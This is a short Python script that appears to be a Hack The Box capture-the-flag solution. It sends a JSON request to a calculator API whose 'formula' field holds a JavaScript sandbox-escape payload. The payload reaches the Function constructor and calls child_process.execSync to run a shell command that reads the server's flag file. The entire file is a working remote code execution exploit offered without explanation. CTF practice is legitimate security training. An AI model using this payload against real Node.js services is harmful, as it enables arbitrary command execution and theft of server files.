import requests
import re
import html

host, port = "94.237.54.192", 39315

url = f"http://{host}:{port}"
url_api = f"{url}/api/calculate"

data = {
    "name":"222",
    "formula": "(function myTag(y){return ''[!y?'__proto__':'constructor'][y]})('constructor')('throw new Error(global.process.mainModule.constructor._load(\"child_process\").execSync(\"cat /app/flag*\"))')()",
    "assignment": 200,
    "exam": 200,
    "paper": 200
}

response = requests.post(url_api, json=data)

flag = re.search(r'HTB\{.*?\}',response.text).group()

decoded_flag = html.unescape(flag)

print(decoded_flag)